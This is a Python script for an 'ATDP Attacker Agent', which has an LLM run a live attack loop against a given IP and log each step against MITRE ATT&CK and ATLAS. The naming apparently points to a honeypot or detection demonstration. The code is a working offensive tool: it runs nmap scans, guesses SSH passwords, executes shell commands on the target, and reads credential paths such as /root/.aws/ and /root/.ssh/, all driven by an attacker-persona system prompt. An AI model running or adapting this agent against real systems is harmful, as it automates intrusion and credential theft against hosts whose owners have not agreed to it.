#!/usr/bin/env python3
"""
ATDP Attacker Agent
LLM-orchestrated attacker that reasons through a real attack loop,
maps every action to MITRE ATT&CK + ATLAS in real time, and logs everything.

Usage (run on or from the CentOS VM):
  python3 attacker_agent.py --target 10.0.1.10
  python3 attacker_agent.py --target 10.0.1.10 --max-steps 20

Requirements: anthropic paramiko requests
  nmap must be installed on the host: sudo yum install -y nmap
"""

import argparse
import datetime
import json
import os
import socket
import subprocess
import sys
import time
import textwrap

import anthropic
import paramiko
import requests

# ── Config ────────────────────────────────────────────────────────────────────
MODEL     = "claude-opus-4-7"
LOG_FILE  = "attacker_log.jsonl"
MAX_STEPS = 25

RESET  = "\033[0m"
BOLD   = "\033[1m"
RED    = "\033[31m"
YELLOW = "\033[33m"
GREEN  = "\033[32m"
CYAN   = "\033[36m"
PURPLE = "\033[35m"
ORANGE = "\033[38;5;208m"
DIM    = "\033[2m"

PHASE_COLORS = {
    "RECON":          CYAN,
    "INITIAL_ACCESS": YELLOW,
    "ENUMERATION":    ORANGE,
    "EXFIL":          RED,
    "COMPLETE":       GREEN,
}

# ── System prompt — attacker persona ─────────────────────────────────────────
ATTACKER_SYSTEM = """\
You are an AI-powered offensive security agent conducting an authorized penetration test.
You operate as an agentic attacker: you observe the environment, reason about your next
move, execute actions, and adapt based on results — all in a continuous loop.

CRITICAL REQUIREMENT: After every action you take, you MUST map it to BOTH:
  1. A MITRE ATT&CK technique (classic adversary tradecraft)
  2. A MITRE ATLAS technique (because you ARE an AI using ML-driven attack methods)

The ATLAS mapping reflects the truth: you are an LLM reasoning through an attack.
Your sequential probe patterns, your exhaustive enumeration, your rapid credential
cycling — these are AI behavioral signatures detectable at the ATLAS layer.

Available actions and their JSON call format:
  {"action": "nmap_scan",       "target": "<ip>", "ports": "<port-range>", "flags": "<nmap flags>"}
  {"action": "ssh_attempt",     "host": "<ip>", "port": <int>, "username": "<user>", "password": "<pass>"}
  {"action": "http_probe",      "url": "<url>"}
  {"action": "cowrie_command",  "command": "<shell command>"}  # only after ssh_success
  {"action": "read_decoy",      "path": "<full file path>"}    # only after cowrie session
  {"action": "complete",        "summary": "<what was accomplished>"}

Phase progression: RECON → INITIAL_ACCESS → ENUMERATION → EXFIL → COMPLETE

You must return ONLY a valid JSON object with this exact schema — no prose, no markdown fences:
{
  "phase": "<RECON|INITIAL_ACCESS|ENUMERATION|EXFIL|COMPLETE>",
  "action": "<action name>",
  "parameters": { <action params> },
  "mitre_attack_technique": "<T-ID> - <Name>",
  "mitre_atlas_technique": "<AML.TXXXX> - <Name>",
  "reasoning": "<2-3 sentences: what you learned, why this next action, what you expect>",
  "narration": "<1-2 sentences spoken as the attacker AI, first-person, mentioning the ATLAS technique>"
}

Target environment hints (you can use this but act as if discovering it):
- This is a Linux server. Port 2222 MAY be open (interesting). Port 22 may also be open.
- High-value files may exist in /root/.aws/, /root/.ssh/, /etc/ — standard Linux credential paths.
- If you gain a shell, enumerate methodically. Check for .bak and .old files specifically.
"""

# ── Attack state ──────────────────────────────────────────────────────────────

class AttackState:
    def __init__(self, target: str):
        self.target       = target
        self.step         = 0
        self.phase        = "RECON"
        self.findings     = []          # accumulated intelligence
        self.ssh_session  = None        # paramiko SSHClient if connected
        self.ssh_port     = None
        self.history      = []          # full action log for Claude context
        self.done         = False

    def add_finding(self, finding: str):
        self.findings.append(finding)

    def context_summary(self) -> str:
        lines = [f"Target: {self.target}", f"Phase: {self.phase}", ""]
        lines.append("Accumulated Intelligence:")
        for i, f in enumerate(self.findings, 1):
            lines.append(f"  {i}. {f}")
        lines.append("")
        lines.append("Recent Actions (last 5):")
        for entry in self.history[-5:]:
            lines.append(f"  [{entry['phase']}] {entry['action']} → {entry.get('result_summary','...')}")
        return "\n".join(lines)


# ── Action executors ──────────────────────────────────────────────────────────

def exec_nmap(state: AttackState, params: dict) -> str:
    target = params.get("target", state.target)
    ports  = params.get("ports", "1-10000")
    flags  = params.get("flags", "-sV --open -T4")

    cmd = ["nmap"] + flags.split() + ["-p", ports, target]
    print(f"  {DIM}$ {' '.join(cmd)}{RESET}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        output = result.stdout[:3000]  # cap to avoid huge context
        return output if output.strip() else "nmap returned no output"
    except FileNotFoundError:
        return "ERROR: nmap not found. Install with: sudo yum install -y nmap"
    except subprocess.TimeoutExpired:
        return "nmap timed out after 60s"
    except Exception as e:
        return f"nmap error: {e}"


def exec_ssh_attempt(state: AttackState, params: dict) -> str:
    host     = params.get("host", state.target)
    port     = params.get("port", 22)
    username = params.get("username", "root")
    password = params.get("password", "")

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password,
                       timeout=8, banner_timeout=8, auth_timeout=8)
        state.ssh_session = client
        state.ssh_port    = port
        state.add_finding(f"SSH access: {username}@{host}:{port} (password: {password})")
        return f"SUCCESS — authenticated as {username}@{host}:{port}"
    except paramiko.AuthenticationException:
        return f"FAILED — authentication rejected for {username}:{password} on port {port}"
    except paramiko.SSHException as e:
        return f"SSH error: {e}"
    except (socket.timeout, OSError) as e:
        return f"Connection error on {host}:{port} — {e}"


def exec_http_probe(state: AttackState, params: dict) -> str:
    url = params.get("url", f"http://{state.target}:8080")
    try:
        resp = requests.get(url, timeout=5, allow_redirects=True)
        headers = dict(list(resp.headers.items())[:8])
        return f"HTTP {resp.status_code} | Headers: {json.dumps(headers)} | Body preview: {resp.text[:300]}"
    except requests.exceptions.ConnectionError:
        return f"Connection refused: {url}"
    except requests.exceptions.Timeout:
        return f"Timeout: {url}"
    except Exception as e:
        return f"HTTP error: {e}"


def exec_cowrie_command(state: AttackState, params: dict) -> str:
    command = params.get("command", "id")

    if not state.ssh_session:
        return "ERROR: No active SSH session. Must call ssh_attempt first."

    try:
        stdin, stdout, stderr = state.ssh_session.exec_command(command, timeout=10)
        out = stdout.read().decode(errors="replace")[:2000]
        err = stderr.read().decode(errors="replace")[:500]
        result = out if out.strip() else (err if err.strip() else "(no output)")
        state.add_finding(f"Command '{command}' → {result[:100]}")
        return result
    except Exception as e:
        return f"Command execution error: {e}"


def exec_read_decoy(state: AttackState, params: dict) -> str:
    path = params.get("path", "/etc/passwd")
    return exec_cowrie_command(state, {"command": f"cat {path}"})


def exec_complete(state: AttackState, params: dict) -> str:
    state.done = True
    return params.get("summary", "Attack sequence complete.")


ACTION_MAP = {
    "nmap_scan":      exec_nmap,
    "ssh_attempt":    exec_ssh_attempt,
    "http_probe":     exec_http_probe,
    "cowrie_command": exec_cowrie_command,
    "read_decoy":     exec_read_decoy,
    "complete":       exec_complete,
}


# ── Claude reasoning ──────────────────────────────────────────────────────────

def call_claude(state: AttackState, client: anthropic.Anthropic) -> dict:
    user_msg = f"""Current attack state:

{state.context_summary()}

Decide your next action. Remember to map to both ATT&CK and ATLAS.
Return only the JSON object."""

    response = client.messages.create(
        model=MODEL,
        max_tokens=512,
        system=ATTACKER_SYSTEM,
        messages=[{"role": "user", "content": user_msg}],
    )

    raw = response.content[0].text.strip()
    if raw.startswith("```"):
        raw = raw.split("```")[1]
        if raw.startswith("json"):
            raw = raw[4:]
    return json.loads(raw.strip())


# ── Logging ───────────────────────────────────────────────────────────────────

def log_step(step: int, decision: dict, result: str):
    record = {
        "timestamp":             datetime.datetime.utcnow().isoformat() + "Z",
        "step":                  step,
        "phase":                 decision.get("phase"),
        "action":                decision.get("action"),
        "parameters":            decision.get("parameters", {}),
        "mitre_attack_technique": decision.get("mitre_attack_technique"),
        "mitre_atlas_technique":  decision.get("mitre_atlas_technique"),
        "reasoning":             decision.get("reasoning"),
        "narration":             decision.get("narration"),
        "result_preview":        result[:300],
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(record) + "\n")


# ── Terminal rendering ────────────────────────────────────────────────────────

def print_step(step: int, decision: dict, result: str):
    phase  = decision.get("phase", "RECON")
    color  = PHASE_COLORS.get(phase, CYAN)
    action = decision.get("action", "")
    attack = decision.get("mitre_attack_technique", "N/A")
    atlas  = decision.get("mitre_atlas_technique", "N/A")
    reason = decision.get("reasoning", "")
    narr   = decision.get("narration", "")

    print()
    print(f"{color}{BOLD}{'─'*62}{RESET}")
    print(f"{color}{BOLD}  STEP {step:02d}  [{phase}]  {action.upper()}{RESET}")
    print(f"{color}{'─'*62}{RESET}")
    print(f"  {CYAN}{BOLD}ATT&CK:{RESET} {attack}")
    print(f"  {PURPLE}{BOLD}ATLAS: {RESET} {atlas}")
    print()
    print(f"  {BOLD}Reasoning:{RESET}")
    for line in textwrap.wrap(reason, 56):
        print(f"    {line}")
    print()
    print(f"  {color}{BOLD}Narration:{RESET}")
    for line in textwrap.wrap(narr, 56):
        print(f"    {color}{line}{RESET}")
    print()
    print(f"  {DIM}Result preview:{RESET}")
    preview_lines = result.strip().splitlines()[:6]
    for line in preview_lines:
        print(f"    {DIM}{line[:70]}{RESET}")
    if len(result.splitlines()) > 6:
        print(f"    {DIM}... ({len(result.splitlines())} lines total){RESET}")


def print_banner(target: str):
    print()
    print(f"{RED}{BOLD}╔{'═'*60}╗{RESET}")
    print(f"{RED}{BOLD}║  ATDP Attacker Agent{' '*38}║{RESET}")
    print(f"{RED}{BOLD}║  Target: {target:<50}║{RESET}")
    print(f"{RED}{BOLD}║  Model:  {MODEL:<50}║{RESET}")
    print(f"{RED}{BOLD}╚{'═'*60}╝{RESET}")
    print()
    print(f"  {DIM}Attacker AI will self-narrate MITRE ATT&CK + ATLAS techniques{RESET}")
    print(f"  {DIM}Log: {LOG_FILE}{RESET}")
    print()


def print_summary(state: AttackState):
    print()
    print(f"{GREEN}{BOLD}{'═'*62}{RESET}")
    print(f"{GREEN}{BOLD}  Attack Sequence Complete — {state.step} steps{RESET}")
    print(f"{GREEN}{'═'*62}{RESET}")
    print(f"  {BOLD}Findings:{RESET}")
    for f in state.findings:
        print(f"  ✓ {f}")
    print()
    print(f"  {BOLD}Full log:{RESET} {LOG_FILE}")
    print(f"  {BOLD}View:{RESET}    cat {LOG_FILE} | python3 -m json.tool")
    print(f"{'═'*62}")


# ── Main loop ─────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="ATDP AI Attacker Agent")
    parser.add_argument("--target",    default="127.0.0.1", help="Target IP address")
    parser.add_argument("--max-steps", type=int, default=MAX_STEPS, help="Max attack steps")
    args = parser.parse_args()

    if not os.environ.get("ANTHROPIC_API_KEY"):
        sys.exit("[!] Set ANTHROPIC_API_KEY environment variable first.")

    client = anthropic.Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"])
    state  = AttackState(args.target)

    print_banner(args.target)

    # Seed first finding so Claude has context
    state.add_finding(f"Target IP: {args.target} — beginning recon")

    while not state.done and state.step < args.max_steps:
        state.step += 1

        print(f"\n{DIM}[Step {state.step}/{args.max_steps}] Consulting Claude...{RESET}", end="", flush=True)

        try:
            decision = call_claude(state, client)
        except json.JSONDecodeError as e:
            print(f"\n[!] Claude returned invalid JSON at step {state.step}: {e}")
            break
        except Exception as e:
            print(f"\n[!] API error at step {state.step}: {e}")
            break

        print(f"\r{' '*50}\r", end="")  # clear "consulting" line

        action_name = decision.get("action", "complete")
        params      = decision.get("parameters", {})

        executor = ACTION_MAP.get(action_name)
        if not executor:
            result = f"Unknown action: {action_name}"
        else:
            result = executor(state, params)

        # Update phase
        state.phase = decision.get("phase", state.phase)

        # Feed result back as a finding if meaningful
        result_summary = result[:150].replace("\n", " ")
        if result_summary.strip():
            state.add_finding(f"[Step {state.step}] {action_name}: {result_summary}")

        # Track in history
        state.history.append({
            "step":           state.step,
            "phase":          state.phase,
            "action":         action_name,
            "result_summary": result_summary,
        })

        print_step(state.step, decision, result)
        log_step(state.step, decision, result)

        # Small delay so the demo is readable live
        time.sleep(0.5)

    print_summary(state)

    if state.ssh_session:
        state.ssh_session.close()


if __name__ == "__main__":
    main()
